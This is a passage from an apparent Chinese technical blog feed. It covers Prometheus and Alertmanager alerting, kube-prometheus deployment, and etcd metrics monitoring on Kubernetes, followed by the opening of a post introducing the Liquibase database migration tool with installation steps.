class="hljs-string">&#x27;qq.com&#x27;</span><br><br>route:<br>  group_by: [<span class="hljs-string">&#x27;alertname&#x27;</span>]<br>  group_wait: 5s<br>  group_interval: 5s<br>  repeat_interval: 5m<br>  receiver: <span class="hljs-string">&#x27;email&#x27;</span><br><br>templates:<br>  - <span class="hljs-string">&#x27;./tmp1/*.tmp1&#x27;</span><br><br>receivers:<br>- name: <span class="hljs-string">&#x27;email&#x27;</span><br>  email_configs:<br>  - to: <span class="hljs-string">&#x27;31013067@qq.com&#x27;</span><br>    send_resolved: <span class="hljs-literal">true</span><br>    headers: &#123; Subject: <span class="hljs-string">&quot;[WARN] 报警邮件&quot;</span> &#125;<br>    html: <span class="hljs-string">&#x27;&#123;&#123; template &quot;cherry.html&quot; . &#125;&#125;&#x27;</span><br><br>inhibit_rules:<br>  - source_match:<br>      severity: <span class="hljs-string">&#x27;critical&#x27;</span><br>    target_match:<br>      severity: <span class="hljs-string">&#x27;warning&#x27;</span><br>    equal: [<span class="hljs-string">&#x27;alertname&#x27;</span>, <span class="hljs-string">&#x27;dev&#x27;</span>, <span class="hljs-string">&#x27;instance&#x27;</span>]<br><br>4 alertmanager语法检查<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# <span class="hljs-built_in">pwd</span><br>/softwares/alertmanager-0.27.0.linux-amd64<br><br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# ./amtool check-config ./alertmanager.yml <br><br>5 重新加载配置信息<br>[root@prometheus-server32 alertmanager-0.27.0.linux-amd64]# ./alertmanager <br><br>6 查看WebUi观察配置是否生效<br>http://10.0.0.32:9093/#/status<br><br>---------------------------------------------<br>prometheus需要修改以下规则文件<br>1 修改规则文件<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /softwares/prometheus-2.53.2.linux-amd64/rules/linux92.yml <br><span class="hljs-built_in">groups</span>:<br>- name: linux92-container-runtime<br>  rules:<br>  - alert: container-42节点挂掉啦<br>    <span class="hljs-built_in">expr</span>: up&#123;instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125; == 0<br>    <span class="hljs-keyword">for</span>: 15s<br>    labels:<br>      school: 001<br>      class: 002<br>    annotations:<br>      summary: <span class="hljs-string">&quot;&#123;&#123; .instance &#125;&#125; 已停止运行超过 15s！&quot;</span><br>  <span class="hljs-comment"># 添加此行用于获取阈值</span><br>      value: <span class="hljs-string">&quot;&#123;&#123; <span class="hljs-variable">$value</span> &#125;&#125;&quot;</span><br>  - alert: container-43节点的挂掉啦<br>    <span class="hljs-built_in">expr</span>: up&#123;instance=<span class="hljs-string">&quot;10.0.0.43:9100&quot;</span>&#125; == 0<br>    <span class="hljs-keyword">for</span>: 15s<br>    labels:<br>      school: 01<br>      class: 02<br>    annotations:<br>      summary: <span class="hljs-string">&quot;&#123;&#123; .instance &#125;&#125; 联邦模式已停止运行超过 15s！&quot;</span><br>  <span class="hljs-comment"># 添加此行用于获取阈值</span><br>      value: <span class="hljs-string">&quot;&#123;&#123; <span class="hljs-variable">$value</span> &#125;&#125;&quot;</span><br>      <br>检查语法并重新加载配置文件<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br></code></pre></td></tr></table></figure><h2 id="29、监控K8S集群"><a href="#29、监控K8S集群" class="headerlink" title="29、监控K8S集群"></a>29、监控K8S集群</h2><p><strong>prometheus-operator</strong></p><p>prometheus-operator可以一键实现对K8S集群的监控</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GitHub地址: https://github.com/prometheus-operator/kube-prometheus<br><br>基于K8S版本选择合适的prometheus-operator<br>https://github.com/prometheus-operator/kube-prometheus#compatibility<br></code></pre></td></tr></table></figure><h4 id="1-prometheus内部监控k8s集群"><a href="#1-prometheus内部监控k8s集群" class="headerlink" title="1.prometheus内部监控k8s集群"></a>1.prometheus内部监控k8s集群</h4><p>普罗米修斯可以部署在k8s内部，也可以部署在k8s外部，企业中一般都是部署在k8s内部</p><p><strong>在K8S集群部署prometheus</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载软件包<br>wget https://github.com/prometheus-operator/kube-prometheus/archive/refs/tags/v0.11.0.tar.gz<br><br>解压软件包<br>[root@master231 ~]# tar xf kube-prometheus-0.11.0.tar.gz -C /softwares/<br><br>切换工作目录，进入到prometheus-operator主目录<br>[root@master231 ~]# <span class="hljs-built_in">cd</span> /softwares/kube-prometheus-0.11.0/<br><br>更改yaml文件，自定义资源<br>[root@master231 kube-prometheus-0.11.0]# vim manifests/prometheusAdapter-deployment.yaml<br>......<br>        <span class="hljs-comment"># image: k8s.gcr.io/prometheus-adapter/prometheus-adapter:v0.9.1</span><br>        image: registry.cn-hangzhou.aliyuncs.com/k8s/prometheus-adapter:v0.9.1<br>...<br><br>[root@master231 kube-prometheus-0.11.0]# vim manifests/kubeStateMetrics-deployment.yaml<br>...<br>        <span class="hljs-comment"># image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.5.0</span><br>        image: registry.cn-hangzhou.aliyuncs.com/k8s/kube-state-metrics:2.5.0<br>        <br>[root@master231 kube-prometheus-0.11.0]# vim manifests/grafana-service.yaml<br>....<br>spec:<br>  ...<br>  <span class="hljs-built_in">type</span>: NodePort<br>  ports:<br>  - name: http<br>    port: 3000<br>    targetPort: http<br>    nodePort: 30080<br>    <br>[root@master231 kube-prometheus-0.11.0]# vim manifests/prometheus-service.yaml<br>....<br>spec:<br>  <span class="hljs-built_in">type</span>: NodePort<br>  ports:<br>  - name: web<br>    port: 9090<br>    targetPort: web<br>    nodePort: 30090<br>    <br>部署服务<br>[root@master231 kube-prometheus-0.11.0]# kubectl apply --server-side -f manifests/setup<br>[root@master231 kube-prometheus-0.11.0]# kubectl <span class="hljs-built_in">wait</span> \<br>--<span class="hljs-keyword">for</span> condition=Established \<br>--all CustomResourceDefinition \<br>--namespace=monitoring<br>[root@master231 kube-prometheus-0.11.0]# kubectl apply -f manifests/<br><br>查看对应的Pod运行列表 ------&gt;如果没运行起来，一般手动导入镜像到对应节点<br>[root@master231 kube-prometheus-0.11.0]# kubectl get pods -n monitoring  -o wide<br>删除镜像，重新拉取<br>[root@master231 kube-prometheus-0.11.0]# kubectl -n monitoring delete pod --all<br>查看pod事件信息<br>[root@master231 kube-prometheus-0.11.0]# kubectl -n monitoring describe prometheus-k8s-0<br>查看所有服务<br>[root@master231 kube-prometheus-0.11.0]# kubectl get svc -A<br>查看svc详情<br>[root@master231 kube-prometheus-0.11.0]# kubectl describe svc -n monitoring prometheus-k8s<br><br>修改收件人和发件人信息<br>[root@master231 kube-prometheus-0.11.0]# vim manifests/alertmanager-secret.yaml <br>里面记录了alertmanager的收件人和发件人信息。<br><br>访问WebUI <br>grafana：账号密码admin<br>http://10.0.0.231:30080<br>------------------------------<br>普罗米修斯：<br>http://10.0.0.231:30090<br>------------------------------<br><br>查看内置的模板 <br>查看后再倒入1860模板对比测试。<br></code></pre></td></tr></table></figure><h4 id="2-prometheus外部监控k8s集群"><a href="#2-prometheus外部监控k8s集群" class="headerlink" title="2.prometheus外部监控k8s集群"></a>2.prometheus外部监控k8s集群</h4><h5 id="监控node-exporter节点"><a href="#监控node-exporter节点" class="headerlink" title="监控node-exporter节点"></a><strong>监控node-exporter节点</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.所有节点导入镜像<br>[root@master231 ~]# docker load -i node-exporter_v1.8.1.tar.gz<br><br>2.在k8smaster编写资源清单<br>[root@master231 ~]# <span class="hljs-built_in">cat</span> ds-node-exporter.yaml <br>apiVersion: apps/v1<br>kind: DaemonSet<br>metadata:<br>  name: ds-node-exporter<br>spec:<br>  selector:<br>    matchLabels:<br>      apps: node-exporter<br>  template:<br>    metadata:<br>      labels:<br>        apps: node-exporter<br>    spec:<br>      hostNetwork: <span class="hljs-literal">true</span><br>      tolerations:<br>      - key: node-role.kubernetes.io/master<br>        effect: NoSchedule<br>      containers:<br>      - name: node-exporter<br>        image: prom/node-exporter:v1.8.1<br>        <span class="hljs-built_in">command</span>:<br>        - /bin/node_exporter<br>        - --web.listen-address=:19100<br><br>3.查看pod ---&gt; 每个节点成功运行<br>[root@master231 ~]# kubectl get pods -o wide<br>NAME                     READY   STATUS        RESTARTS   AGE    IP           NODE      <br>ds-node-exporter-5b4gc   1/1     Running       0          35s    10.0.0.233   worker233 <br>ds-node-exporter-dmnnj   1/1     Running       0          35s    10.0.0.232   worker232 <br>ds-node-exporter-hpj9h   1/1     Running       0          35s    10.0.0.231   master231 <br><br>4.修改Prometheus的配置文件并重新加载<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: k8s-node-exporter<br>    static_configs:<br>    - targets:<br>      - 10.0.0.231:19100<br>      - 10.0.0.232:19100<br>      - 10.0.0.233:19100<br>      <br>4.访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>5.grafana采集普罗米修斯31数据源的信息，导入模板ID<br>1860<br><br></code></pre></td></tr></table></figure><h5 id="监控云原生应用etcd案例"><a href="#监控云原生应用etcd案例" class="headerlink" title="监控云原生应用etcd案例"></a><strong>监控云原生应用etcd案例</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.查看etcd证书存储路径<br>[root@master231 ~]#  egrep <span class="hljs-string">&quot;\--key-file|--cert-file&quot;</span> /etc/kubernetes/manifests/etcd.yaml <br>    - --cert-file=/etc/kubernetes/pki/etcd/server.crt<br>    - --key-file=/etc/kubernetes/pki/etcd/server.key<br><br>2 测试etcd证书访问的metrics接口<br>[root@master231 ~]# curl -s --cert /etc/kubernetes/pki/etcd/server.crt  --key /etc/kubernetes/pki/etcd/server.key https://10.0.0.231:2379/metrics -k | <span class="hljs-built_in">tail</span><br><br>3. 创建etcd的service<br>[root@master231 ~]# <span class="hljs-built_in">cat</span> etcd-svc.yaml <br>apiVersion: v1<br>kind: Endpoints<br>metadata:<br>  name: etcd-k8s<br>  namespace:  kube-system<br>subsets:<br>- addresses:<br>  - ip: 10.0.0.231<br>  ports:<br>  - name: https-metrics<br>    port: 2379<br>    protocol: TCP<br><br>---<br><br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: etcd-k8s<br>  namespace: kube-system<br>  labels:<br>    apps: etcd<br>spec:<br>  ports:<br>  - name: https-metrics<br>    port: 2379<br>    targetPort: 2379<br>  <span class="hljs-built_in">type</span>: ClusterIP<br>  <br>[root@master231 ~]# kubectl apply -f etcd-svc.yaml<br>[root@master231 ~]# kubectl get svc -n kube-system -l apps=etcd<br>NAME       TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>etcd-k8s   ClusterIP   10.200.33.157   &lt;none&gt;        2379/TCP   36m<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl -n kube-system describe svc etcd-k8s  | grep Endpoints<br>Endpoints:         10.0.0.231:2379<br><br><br>3.基于创建的svc访问测试连通性<br>[root@master231 ~]# curl -s --cert /etc/kubernetes/pki/etcd/server.crt  --key /etc/kubernetes/pki/etcd/server.key https://10.200.33.157:2379/metrics -k | <span class="hljs-built_in">tail</span> -1 <br>promhttp_metric_handler_requests_total&#123;code=<span class="hljs-string">&quot;503&quot;</span>&#125; 0<br><br>4.创建etcd证书的secrets并挂载到Prometheus server<br>4.1 查找需要挂载etcd的证书文件路径<br>[root@master231 ~]# egrep <span class="hljs-string">&quot;\--key-file|--cert-file|--trusted-ca-file&quot;</span> /etc/kubernetes/manifests/etcd.yaml   <br>    - --cert-file=/etc/kubernetes/pki/etcd/server.crt<br>    - --key-file=/etc/kubernetes/pki/etcd/server.key<br>    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt<br>[root@master231 ~]# <br><br><br>4.2 根据etcd的实际存储路径创建secrets<br>[root@master231 ~]# kubectl create secret generic etcd-tls --from-file=/etc/kubernetes/pki/etcd/server.crt --from-file=/etc/kubernetes/pki/etcd/server.key  --from-file=/etc/kubernetes/pki/etcd/ca.crt -n monitoring <br>secret/etcd-tls created<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl -n monitoring get secrets etcd-tls <br>NAME       TYPE     DATA   AGE<br>etcd-tls   Opaque   3      12s<br>[root@master231 ~]# <br><br><br>4.3 修改Prometheus的资源，修改后会自动重启<br>[root@master231 ~]# kubectl -n monitoring edit prometheus k8s<br>...<br>spec:<br>  secrets:<br>  - etcd-tls<br>  ...  <br>[root@master231 ~]# kubectl -n monitoring get pods -l app.kubernetes.io/component=prometheus -o wide<br>NAME               READY   STATUS    RESTARTS   AGE   IP            NODE        NOMINATED NODE   READINESS GATES<br>prometheus-k8s-0   2/2     Running   0          74s   10.100.1.57   worker232   &lt;none&gt;           &lt;none&gt;<br>prometheus-k8s-1   2/2     Running   0          92s   10.100.2.28   worker233   &lt;none&gt;           &lt;none&gt;<br>[root@master231 ~]# <br><br><br>4.4 查看证书是否挂载成功<br>[root@master231 ~]# kubectl -n monitoring <span class="hljs-built_in">exec</span> prometheus-k8s-0 -c prometheus -- <span class="hljs-built_in">ls</span> -l /etc/prometheus/secrets/etcd-tls<br>total 0<br>lrwxrwxrwx    1 root     2000            13 Jan 24 14:07 ca.crt -&gt; ..data/ca.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.crt -&gt; ..data/server.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.key -&gt; ..data/server.key<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl -n monitoring <span class="hljs-built_in">exec</span> prometheus-k8s-1 -c prometheus -- <span class="hljs-built_in">ls</span> -l /etc/prometheus/secrets/etcd-tls<br>total 0<br>lrwxrwxrwx    1 root     2000            13 Jan 24 14:07 ca.crt -&gt; ..data/ca.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.crt -&gt; ..data/server.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.key -&gt; ..data/server.key<br>[root@master231 ~]# <br><br><br>5.创建ServerMonitor<br>5.1 创建ServiceMonitor资源关联etcd的svc<br>[root@master231 ~]# <span class="hljs-built_in">cat</span>  etcd-smon.yaml <br>apiVersion: monitoring.coreos.com/v1<br>kind: ServiceMonitor<br>metadata:<br>  name: etcd-smon<br>  namespace: monitoring<br>spec:<br>  <span class="hljs-comment"># 指定job的标签，可以不设置。</span><br>  jobLabel: kubeadm-etcd-k8s<br>  <span class="hljs-comment"># 指定监控后端目标的策略</span><br>  endpoints:<br>    <span class="hljs-comment"># 监控数据抓取的时间间隔</span><br>  - interval: 30s<br>    <span class="hljs-comment"># 指定metrics端口，这个port对应Services.spec.ports.name</span><br>    port: https-metrics<br>    <span class="hljs-comment"># Metrics接口路径</span><br>    path: /metrics<br>    <span class="hljs-comment"># Metrics接口的协议</span><br>    scheme: https<br>    <span class="hljs-comment"># 指定用于连接etcd的证书文件</span><br>    tlsConfig:<br>      <span class="hljs-comment"># 指定etcd的CA的证书文件</span><br>      caFile:  /etc/prometheus/secrets/etcd-tls/ca.crt<br>      <span class="hljs-comment"># 指定etcd的证书文件</span><br>      certFile: /etc/prometheus/secrets/etcd-tls/server.crt<br>      <span class="hljs-comment"># 指定etcd的私钥文件</span><br>      keyFile: /etc/prometheus/secrets/etcd-tls/server.key<br>      <span class="hljs-comment"># 关闭证书校验，毕竟咱们是自建的证书，而非官方授权的证书文件。</span><br>      insecureSkipVerify: <span class="hljs-literal">true</span><br>  <span class="hljs-comment"># 监控目标Service所在的命名空间</span><br>  namespaceSelector:<br>    matchNames:<br>    - kube-system<br>  <span class="hljs-comment"># 监控目标Service目标的标签。</span><br>  selector:<br>    <span class="hljs-comment"># 注意，这个标签要和etcd的service的标签保持一致哟</span><br>    matchLabels:<br>      apps: etcd<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl apply -f etcd-smon.yaml <br>servicemonitor.monitoring.coreos.com/etcd-smon created<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl get smon -n monitoring yinzhengjie-etcd-smon <br>NAME                    AGE<br>yinzhengjie-etcd-smon   8s<br>[root@master231 ~]# <br><br><br>5.2.访问Prometheus的WebUI<br>http://10.0.0.233:30090/targets?search=<br><br><br>6.查看etcd的数据<br>etcd_cluster_version<br><br>7.使用grafana查看etcd数据<br>http://10.0.0.233:30080/?orgId=1<br>3070<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>监控篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>监控篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库版本管理工具之Liquibase</title>
    <link href="/2025/04/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E4%B9%8BLiquibase/"/>
    <url>/2025/04/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E4%B9%8BLiquibase/</url>
    
    <content type="html"><![CDATA[<h2 id="一、liquibase介绍"><a href="#一、liquibase介绍" class="headerlink" title="一、liquibase介绍"></a>一、liquibase介绍</h2><p>研发过程中经常涉及到数据库变更，对表结构的修复及对数据的修改，为了保证各环境都能正确的进行变更我们可能需要维护一个数据库升级文档来保存这些记录，有需要升级的环境按文档进行升级。</p><p>这样手工维护有几个缺点：</p><ol><li>无法保证每个环境都按要求执行</li><li>遇到问题不一定有相对的回滚语句</li><li>无法自动化</li></ol><p>为了解决这些问题，我们进行了一些调研，主要调研对象是Liquibase和Flyway，我们希望通过数据库版本管理工具实现以下几个目标：</p><ol><li><p>数据库升级</p></li><li><p>数据库回滚</p></li><li><p>版本标记</p></li></ol><h4 id="1-工作流程"><a href="#1-工作流程" class="headerlink" title="1.工作流程"></a><strong>1.工作流程</strong></h4><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/eac9ad7d79e24e1e8fa0e39c3cfea9c6.png" alt="在这里插入图片描述"></p><h4 id="2-changeLog文件结构"><a href="#2-changeLog文件结构" class="headerlink" title="2.changeLog文件结构"></a>2.changeLog文件结构</h4><p>管理的数据最小单元为 changeSet ，这个 changeSet 可以用 xml,yaml,json,sql 来编写</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ca83f172b6d04aa4bd684d6deabad00f.png" alt="在这里插入图片描述"></p><h4 id="3-数据库变更日志和数据库变更日志锁"><a href="#3-数据库变更日志和数据库变更日志锁" class="headerlink" title="3.数据库变更日志和数据库变更日志锁"></a><strong>3.数据库变更日志和数据库变更日志锁</strong></h4><ul><li><p>当您部署更改时，Liquibase会在数据库中创建两个表：<a href="https://docs.liquibase.com/concepts/tracking-tables/databasechangelog-table.html">DATABASECHANGELOG</a>和<a href="https://docs.liquibase.com/concepts/tracking-tables/databasechangeloglock-table.html">DATABASECHANGELOGLOCK</a>。</p></li><li><p>DATABASECHANGELOG表跟踪已部署的变更，以便您有记录。Liquibase将changelog文件中的变更集与DATABASECHANGELOG跟踪表进行比较，并仅部署新的变更集。</p></li><li><p>DATABASECHANGELOGLOCK可防止多个Liquibase实例同时更新数据库。该表在部署期间管理对DATABASECHANGELOG表的访问，并确保只有一个Liquibase实例正在更新数据库</p></li></ul><h2 id="二、liquibase部署"><a href="#二、liquibase部署" class="headerlink" title="二、liquibase部署"></a>二、liquibase部署</h2><p>官方文档：<a href="https://docs.liquibase.com/concepts/introduction-to-liquibase.html">https://docs.liquibase.com/concepts/introduction-to-liquibase.html</a></p><h4 id="1-下载二进制包"><a href="#1-下载二进制包" class="headerlink" title="1.下载二进制包"></a><strong>1.下载二进制包</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.liquibase.com/download<br></code></pre></td></tr></table></figure><h4 id="2-解压到指定目录"><a href="#2-解压到指定目录" class="headerlink" title="2.解压到指定目录"></a><strong>2.解压到指定目录</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local liquibase]# <span class="hljs-built_in">pwd</span><br>/opt/liquibase<br><br>[root@node1.local liquibase]# tar xf liquibase-4.30.0.tar.gz<br><br>[root@node1.local liquibase]# ll<br>total 156868<br>drwxr-xr-x 6 root     root      4096 Dec 16 11:15 ./<br>drwxr-xr-x 5 root     root      4096 Dec 16 11:14 ../<br>-rw-r--r-- 1 ftpadmin  127        50 Nov  1 01:49 ABOUT.txt<br>-rw-r--r-- 1 ftpadmin  127    374611 Nov  1 01:49 changelog.txt<br>drwxr-xr-x 6 ftpadmin  127      4096 Nov  1 01:49 examples/<br>-rw-r--r-- 1 ftpadmin  127     10388 Nov  1 01:49 GETTING_STARTED.txt<br>drwxr-xr-x 4 ftpadmin  127      4096 Nov  1 01:51 internal/<br>drwxr-xr-x 2 ftpadmin  127      4096 Nov  1 01:49 lib/<br>drwxr-xr-x 4 ftpadmin  127      4096 Nov  1 01:49 licenses/<br>-rw-r--r-- 1 ftpadmin  127     11345 Nov  1 01:49 LICENSE.txt<br>-rwxr-xr-x 1 ftpadmin  127      1509 Nov  1 01:13 liquibase*<br>-rw-r--r-- 1 root     root 160180547 Dec 16 11:11 liquibase-4.30.0.tar.gz<br>-rw-r--r-- 1 ftpadmin  127      1134 Nov  1 01:13 liquibase.bat<br>-rw-r--r-- 1 ftpadmin  127      2721 Nov  1 01:49 README.txt<br>-rw-r--r-- 1 ftpadmin  127       766 Nov  1 01:49 UNINSTALL.txt<br><br><br>检查JRE<br>$ java -version<br>java version <span class="hljs-string">&quot;1.8.0_231&quot;</span><br>Java(TM) SE Runtime Environment (build 1.8.0_231-b11)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.231-b11, mixed mode)<br>如果没有安装Java请自行安装<br></code></pre></td></tr></table></figure><h4 id="3-配置环境变量"><a href="#3-配置环境变量" class="headerlink" title="3.配置环境变量"></a><strong>3.配置环境变量</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# vim .bashrc<br><span class="hljs-built_in">export</span> LIQUIBASE_HOME=/opt/liquibase<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$LIQUIBASE_HOME</span><br><br><br>[root@node1.local ~]# <span class="hljs-built_in">source</span> 